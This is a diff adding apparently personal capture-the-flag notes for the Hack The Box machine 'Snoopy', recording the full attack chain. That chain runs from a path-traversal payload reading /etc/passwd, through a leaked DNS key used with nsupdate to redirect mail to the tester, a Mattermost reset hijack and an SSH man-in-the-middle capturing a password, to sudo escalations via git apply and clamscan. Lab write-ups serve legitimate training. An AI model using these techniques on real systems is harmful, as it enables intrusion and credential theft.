@@ -1,0 +1,151 @@
+Snoopy:
+  Difficulty: Easy
+  OS: Linux
+
+  Listening ports: 22, 53, 80
+
+  DNS (53/udp, 53/tcp):
+    Version: "bind9 9.18.12"
+    Records:
+      "snoopy.htb.   86400 IN  SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400"
+      "snoopy.htb.   86400 IN  NS  ns1.snoopy.htb."
+      "snoopy.htb.   86400 IN  NS  ns2.snoopy.htb."
+      "mattermost.snoopy.htb.  86400 IN  A 172.18.0.3"
+      "mm.snoopy.htb.    86400 IN  A 127.0.0.1"
+      "ns1.snoopy.htb.   86400 IN  A 10.0.50.10"
+      "ns2.snoopy.htb.   86400 IN  A 10.0.51.10"
+      "postgres.snoopy.htb.  86400 IN  A 172.18.0.2"
+      "provisions.snoopy.htb.  86400 IN  A 172.18.0.4"
+      "www.snoopy.htb.   86400 IN  A 127.0.0.1"
+      "snoopy.htb.   86400 IN  SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400"
+    172.18.0.4: At least 4 docker containers
+
+  Website (http://snoopy.htb):
+    Domain: "snoopy.htb"
+    Version: "nginx 1.18.0 Ubuntu"
+    Endpoints:
+      /team.html:
+        Usernames: cschultz, sbrown, hangel, lpelt
+      /contact.html:
+        "Attention: As we migrate DNS records to our new domain please be advised that our mailserver 'mail.snoopy.htb' is currently offline"
+        "mail.snoopy.htb is currently offline"
+      /download:
+        Downloads "press_release.zip":
+          announcement.pdf:
+            Exif:
+              "Producer: Skia/PDF m106"
+              "Creator: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.1.16 Chrome/106.0.5249.199 Electron/21.4.1 Safari/537.36"
+          snoopysec_marketing.mp4:
+            Email: "sbrown@snoopy.htb"
+          Takes "file" parameter
+        Vulnerabilities:
+          LFI:
+            /etc/passwd: None
+            ../../../../../../../etc/passwd: None
+            announcement.pdf: Get announcement.pdf
+            ../announcement.pdf: Also get announcement.pdf ("../" gets removed)
+            ....//announcement.pdf: No result ("../" doesn't get removed recursively)
+            ....//....//....//....//....//....//....//etc/passwd:
+              Received /etc/passwd:
+                Write exploit: readFile.sh
+          Command Injection: None
+
+  Website (http://mm.snoopy.htb):
+    Mattermost 2023
+    Creds:
+      admin:admin: No
+      admin:password: No
+      snoopy:snoopy: No
+    Password reset:
+      sbrown@snoopy.htb: "Failed to send password reset email"
+      Any other email: "If the account exists, a password reset email will be sent"
+    
+  Local files:
+    /etc/passwd:
+      "cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash"
+      "sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash"
+      "clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin"
+      "lpelt:x:1003:1004::/home/lpelt:/bin/bash"
+      "cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash"
+      "vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash"
+    /etc/hosts: Nothing
+    /proc/self/environ: Empty
+    /etc/nginx/sites-enabled/default: Nothing
+    /home/.../.ssh/id_rsa: Nothing
+    /var/www/html/download.php: Nothing useful
+    /etc/bind/named.conf.local:
+      file: "/var/lib/bind/db.snoopy.htb"
+      allow-update: "{ key 'rndc-key'; }"
+    /var/lib/bind/db.snoopy.htb: Nothing new
+    /etc/bind/named.conf:
+      key: "rndc-key"
+      algorithm: "hmac-sha256"
+      secret: "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="
+
+  DNS (Bind9):
+    Add mail.snoopy.htb record pointing to me:
+      nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=":
+        server snoopy.htb
+        update add mail.snoopy.htb 86400 A 10.10.14.23
+        send
+
+  Website (http://mm.snoopy.htb):
+    /reset_password:
+      "sbrown@snoopy.htb":
+        "If the account exists, a password reset email will be sent"
+
+  Local SMTP Server (sudo python -m smtpd -n -c DebuggingServer 0.0.0.0:25):
+    From: "No-Reply" <no-reply@snoopy.htb>
+    Subject: [Mattermost] Reset your password
+    "Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dac8p6=3mh57rtfqag1u6nibmofjrmjiioz7h41xkikkaiqo1uzmger1138u5gfn58 )":
+      Fixed url: "http://mm.snoopy.htb/reset_password_complete?token=ac8p63mh57rtfqag1u6nibmofjrmjiioz7h41xkikkaiqo1uzmger1138u5gfn58"
+
+  Website (Authenticated) (http://mm.snoopy.htb):
+    As sbrown:
+      Server: DevSecOps
+      Channels:
+        - Off Topic: Empty
+        - Town Square:
+          Talking about setting up ClamAV
+          cbrown wants to make sure that when submiting a "provision", the requested host is working with their IPA otherwise he won't be able to log in
+    As admin (admin@local.htb):
+      Channels:
+        - Off Topic
+        - Town Square
+        - Server Provisioning:
+          Empty
+          Non-default "/server_provision" command:
+            "Submit a request for for a new server provision. An IT staff member will be with you shortly.":
+              OS: "Linux TCP/2222"
+              Submit with random ip:
+                Receive a DM from cbrown: "something wrong with this instance? i cant access it" 
+              Submit with my ip:
+                Receive connection on tcp/2222: "SSH-2.0-paramiko_3.1.0":
+                  Setup SSH MITM:
+                    Username: "cbrown"
+                    Password: "sn00pedcr3dential!!!":
+                      VALID SSH CREDS
+
+  Shell as cbrown:
+    id: "devops" group
+    files/directories owned by devops group: None
+    sudo -l: "(sbrown) PASSWD: /usr/bin/git apply *":
+      Can be used to write to any file:
+        Write public key to /home/sbrown/.ssh/authorized_keys:
+          Can log-in as sbrown with private key
+
+  Shell as sbrown:
+    id: "devops" group
+    Listening ports: 22,53,68,80,953,8065
+    Processes:
+      "_laurel /usr/local/sbin/laurel --config /etc/laurel/config.toml":
+        /etc/laurel/config.toml: Nothing
+      "root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8065 -container-ip 172.18.0.3 -container-port 8065":
+        Mattermost instance
+    sudo -l:
+      "(root) NOPASSWD: /usr/local/bin/clamscan":
+        Scanning /root/root.txt with debug and verbose flag: Not displaying flag
+        Using /root/root.txt as virus database: Not displaying flag
+        Using /root/root.txt as virus database with debug and verbose flag: Not displaying flag
+        Using /root/root.txt as file-list: FLAG DISPLAYED IN ERROR MESSAGE
+
